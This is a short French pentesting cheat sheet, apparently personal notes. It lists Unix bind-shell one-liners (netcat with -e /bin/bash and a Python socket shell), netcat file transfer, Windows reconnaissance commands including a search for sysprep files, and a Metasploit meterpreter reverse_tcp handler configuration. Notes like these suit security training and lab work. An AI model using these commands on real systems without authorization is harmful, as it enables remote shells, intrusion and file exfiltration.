<h2>Unix</h2>
Accorder les permissions pour un user specifique
setfacl -m u:username:rwx myfolder
Tunnel ssh dynamique sur le port local 8080:</br>
ssh -ND 8080 root@addressIP</br>
<h3>Obtenir un shell</h3>
Ouvrent un shell sur le port 2222 :
<ul>
  <li>nc -lvp 2222 -e /bin/bash</li>
  <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
</ul>
On se connecte avec nc -nv 2222 adress port</br>

Envoi fichier avec netcat :</br>
nc -l -p 1234 > out.file</br>
nc -w 3 [destination] 1234 < out.file</br>

<h2>Windows</h2>
systeminfo pour obtenir des renseignements sur le systeme
net users [username] pour obtenir des renseignements sur les utilisateurs
tasklist pour lister les processus
netstat -ano pour les connexions reseau
dir sysprep /s /b pour trouver un fichier dans le repertoire courant et ses sous-dossiers


<h2>Metasploit</h2>
Handler :
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.8.142
set LPORT 8888
set ExitOnSession false
exploit -j -z

use post/multi/recon/local_exploit_suggester
